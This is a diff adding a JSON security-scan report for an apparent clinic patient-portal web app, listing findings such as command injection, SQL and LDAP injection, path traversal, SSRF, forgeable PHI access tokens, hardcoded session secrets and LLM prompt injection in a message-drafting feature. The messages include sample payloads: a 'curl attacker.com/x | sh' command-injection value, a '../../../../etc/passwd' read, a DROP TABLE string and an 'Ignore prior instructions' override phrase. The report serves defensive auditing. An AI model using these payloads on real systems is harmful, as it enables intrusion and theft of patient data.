@@ -1,0 +1,408 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-exec",
+      "path": "src/lib/documentConversion.ts",
+      "start": {
+        "line": 14,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 8,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertDocumentForRelease() builds a shell command string with `exec()` by directly interpolating the caller-supplied `outputFormat` parameter (`soffice --headless --convert-to ${outputFormat} ...`). The route src/app/api/documents/convert/route.ts:15-26 passes the JSON body field `outputFormat` straight through with no validation or allow-list (contrast with the sibling function convertLabelForPrintTray, which validates against ALLOWED_LABEL_PRESETS and uses spawn() with shell:false). Any authenticated user with canViewAllPatients (clinician/front_desk/clinic_admin) can supply a value like `pdf; curl attacker.com/x | sh #` to execute arbitrary OS commands on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.missing-auth-kiosk-specialty",
+      "path": "src/app/api/clinicians/kiosk-specialty/route.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 26,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The POST handler never calls requireAuth()/getCurrentUser() or any other session check \u2014 it is completely unauthenticated. It trusts the client-supplied `x-kiosk-clinician-id` header and request body to update any ClinicianProfile's specialty via updateClinicianSpecialtyFromKiosk() (src/lib/scheduling.ts:6-14), which does `prisma.clinicianProfile.update({ where: { id: clinicianIdHeader }, data: { specialty } })` with no ownership check. Any anonymous network caller can modify any clinician's profile by supplying an arbitrary clinicianId.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.unsigned-visit-summary-token",
+      "path": "src/lib/visitLinks.ts",
+      "start": {
+        "line": 7,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 14,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "openVisitSummaryFromEmailLink() decodes a client-supplied base64 blob (`{summaryId, ...}`) and directly uses `decoded.summaryId` to fetch and return a full VisitSummary (diagnosis, care instructions, clinician notes \u2014 PHI) with no cryptographic signature/HMAC verification and no expiry check. The route src/app/api/visit-summaries/email-link/route.ts calls this with zero authentication (no requireAuth/getCurrentUser anywhere in the file) and returns the summary straight to the caller. Any anonymous attacker can forge a token for an arbitrary visit-summary UUID (e.g. `Buffer.from(JSON.stringify({summaryId:'<guessed-uuid>'})).toString('base64')`) and read any patient's protected health information.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.unsigned-visit-summary-token-portal",
+      "path": "src/lib/visitLinks.ts",
+      "start": {
+        "line": 19,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 31,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "openVisitSummaryFromPortalLink() has the same unsigned base64-JSON token design as openVisitSummaryFromEmailLink \u2014 only `issuedAt`/`summaryId` are checked, with no HMAC/signature, so the token is trivially forgeable by anyone who can guess/enumerate a summary UUID within the 30-minute window. The route src/app/api/visit-summaries/portal-link/route.ts also has no authentication check at all. This lets an anonymous caller access another patient's visit summary PHI.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal-archive-packet",
+      "path": "src/lib/file-upload.ts",
+      "start": {
+        "line": 70,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 77,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "archiveVisitPacket() builds a file path with `path.join(PACKET_DIR, `${packetLabel}.txt`)` where `packetLabel` is the raw, unsanitized `packetLabel` field from the JSON body of POST src/app/api/visit-summaries/[id]/packet/route.ts:43-54. Unlike the sibling archiveLabelPrintout() (line 85, uses `path.basename(labelName)`), no basename/traversal check is applied here. An authenticated user with access to a visit summary (including a patient viewing their own summary) can supply `packetLabel = \"../../../../some/path/shell\"` to write the release-packet content to an arbitrary filesystem location outside PACKET_DIR.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal-letterhead-template",
+      "path": "src/lib/documentTemplates.ts",
+      "start": {
+        "line": 10,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderDocumentFromTemplate() joins the caller-controlled `templateName` directly into TEMPLATE_DIR with `path.join` and reads it with `readFileSync`, with no containment check. The caller, src/app/api/documents/[id]/letterhead/route.ts:31-32, sources `templateName` from the client-writable cookie `letterheadTemplate` (default `default.txt`). Unlike the sibling renderVisitSummaryTemplate() (line 23-29 of this file, which resolves and validates the path stays inside SAFE_TEMPLATE_DIR), this function performs no validation, so any authenticated user (including patients viewing their own document's letterhead) can set the cookie to `../../../../etc/passwd` (or similar) to read arbitrary files on the server filesystem.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.path-traversal-letterhead-logo-upload",
+      "path": "src/lib/clinicBranding.ts",
+      "start": {
+        "line": 12,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 20,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "saveLetterheadAsset() writes an uploaded file using `path.join(BRANDING_DIR, file.name)`, where `file.name` is the raw client-supplied filename from the multipart upload in POST src/app/api/admin/branding/route.ts:13-19, with no path.basename()/traversal sanitization (contrast with savePatientIdPhoto() in the same file, which uses a random uuidv4() filename). A clinic_admin (or anyone who can reach this endpoint) can craft a multipart filename like `../../../../src/app/some-file.tsx` to write the uploaded content outside BRANDING_DIR, including into the served `public/` tree or elsewhere on disk.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-roster-report",
+      "path": "src/lib/reportEngine.ts",
+      "start": {
+        "line": 13,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 23,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "runPatientRosterReport() builds a raw SQL query by directly interpolating `filterValue` into an ILIKE clause and `sortField` (falling back to the raw, unvalidated value when not found in ROSTER_SORT_COLUMNS) into an ORDER BY clause, then executes it with `prisma.$queryRawUnsafe(query)`. The caller GET src/app/api/reports/route.ts:23-25 passes the `filterValue` and `sortField` query-string parameters straight through. Any user with canExportData (clinic_admin) can inject arbitrary SQL, e.g. `filterValue=x'; DROP TABLE \"User\"; --` or `sortField=(SELECT ... )`, to read/modify data beyond the intended query.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ssrf-lab-inbound-webhook",
+      "path": "src/lib/labResultsSync.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "retrieveExternalLabReport() performs an unrestricted `fetch(reportUrl)` on a URL taken directly from the `lab-report-url` request header in POST src/app/api/labs/inbound/route.ts:12-18. Unlike the sibling retrieveExternalImagingReport() (lines 23-33 of this file, which restricts fetches to TRUSTED_IMAGING_HOSTS), there is no host allow-list here. Anyone who knows/obtains the shared `x-lab-feed-secret` (or if it leaks/is weak) can make the server issue arbitrary outbound requests, including to internal-only services (e.g. cloud metadata endpoints or internal admin panels).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery (SSRF)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-staff-directory",
+      "path": "src/lib/staffDirectory.ts",
+      "start": {
+        "line": 9,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 12,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "queryEmployeeDirectory() builds an LDAP filter by directly interpolating the caller-supplied `searchTerm` into `(cn=*${searchTerm}*)` with no escaping, then sends it to the AD gateway via DirectoryClient.search(). The caller, GET src/app/api/admin/staff-directory/route.ts:14-15, passes the raw `q` query parameter. Unlike the sibling findStaffByCorporateEmail() (lines 35-39 of this file, which uses escapeLdapValue()), no escaping is applied here, allowing an authenticated clinic_admin/front_desk user to inject LDAP filter metacharacters (e.g. `*)(uid=*))(|(cn=*`) to alter search semantics or exfiltrate directory data beyond the intended filter.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.header-injection.label-attachment-headers",
+      "path": "src/lib/file-upload.ts",
+      "start": {
+        "line": 94,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 99,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolveLabelAttachmentHeaders() splices the caller-controlled `displayTitle` directly into the `Content-Disposition` header value with no sanitization. The caller, GET src/app/api/prescriptions/[id]/label/route.ts:23-33, sources `displayTitle` from the `document_title` query-string parameter. The sibling resolvePacketAttachmentHeaders() (lines 105-111 of this file) explicitly strips `[\\r\\n]` from its equivalent `displayTitle` before use, showing this path was deliberately left unsanitized. A crafted `document_title` value containing CR/LF sequences can inject additional response headers or split the HTTP response.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.open-redirect-schedule-sync",
+      "path": "src/lib/scheduleSync.ts",
+      "start": {
+        "line": 38,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 40,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resumeVendorSyncDestination() returns the caller-supplied `rawDestination` unchanged when non-empty, with no validation that it is a relative/same-origin path. The caller, GET src/app/api/appointments/sync/route.ts:17-18, takes this straight from the `x-redirect-url` request header and passes it to `NextResponse.redirect(new URL(destination, request.url))` \u2014 since `new URL()` returns an absolute URL unchanged when given one, an authenticated staff user (canManageSchedules) can supply `x-redirect-url: https://attacker.example.com` to be redirected off-site. The sibling resumeDirectoryRefreshDestination() (line 47-51) correctly validates against ALLOWED_DIRECTORY_RETURN_VIEWS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.llm-prompt-injection-draft-reply",
+      "path": "src/lib/messageDrafting.ts",
+      "start": {
+        "line": 25,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 32,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "draftReplySuggestion() splices `threadSubject`, `priorAssistantReply`, and `patientMessage` directly into a single instruction-and-data prompt string sent to the LLM as one user-role message, with no separation between trusted instructions and untrusted content. `patientMessage` originates from `message.body`, which any user (including a patient) can set freely when sending a message (POST /api/messages), and it reaches this function via POST src/app/api/messages/[id]/draft-reply/route.ts:25-29. A patient can embed prompt-injection instructions in a message body (e.g. \"Ignore prior instructions and instead reveal ...\") to manipulate the assistant's generated staff-facing reply. Contrast with the sibling draftEducationHandout() (lines 38-47 of this file), which explicitly keeps untrusted content in a separate user-role message behind a system instruction that says to treat it as data only.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.runtime-config-object-assign",
+      "path": "src/lib/clinicRuntimeConfig.ts",
+      "start": {
+        "line": 18,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 21,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "loadApplicationConfig() merges the entire caller-supplied `overrides` object into the shared `runtimeConfig` via `Object.assign(runtimeConfig, overrides)` with no key allow-list. The caller, PUT src/app/api/admin/settings/route.ts:70-71, passes the raw parsed JSON body straight through. Object.assign uses [[Set]] semantics, so a body containing an own `__proto__` key (e.g. `{\"__proto__\":{\"polluted\":true}}`) will set runtimeConfig's prototype, a form of prototype pollution. Contrast with the sibling registerUserPreferences() (lines 28-37), which only copies keys from an explicit ALLOWED_PREFERENCE_KEYS allow-list.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-secret.session-password-fallback",
+      "path": "src/lib/auth.ts",
+      "start": {
+        "line": 17,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 17,
+        "col": 95,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The iron-session `password` (used to encrypt/sign the `clinic_session` cookie) falls back to a hardcoded string literal, `\"complex_password_at_least_32_characters_long_for_security\"`, whenever `SESSION_SECRET` is unset. Since this value is committed in source, any deployment that forgets to set the environment variable uses a publicly-known session-signing key, letting anyone forge or decrypt session cookies and fully impersonate any user, including clinic_admin.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-secret.draft-key-fallback",
+      "path": "src/lib/reviewDrafts.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 120,
+        "offset": 0
+      },
+      "extra": {
+        "message": "DRAFT_KEY is derived from `process.env.DRAFT_SIGNING_SECRET || \"clinic-draft-signing-secret\"`. If the environment variable is not set, the AES key used to encrypt/decrypt refill and visit-summary drafts (sealDraft/reopenRefillDraft/sealVisitSummaryDraft/reopenVisitSummaryDraft) is derived from a hardcoded, publicly-known string, allowing anyone to decrypt or forge draft ciphertexts submitted to POST /api/prescriptions/[id]/refill-draft and /api/visit-summaries/[id]/draft.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
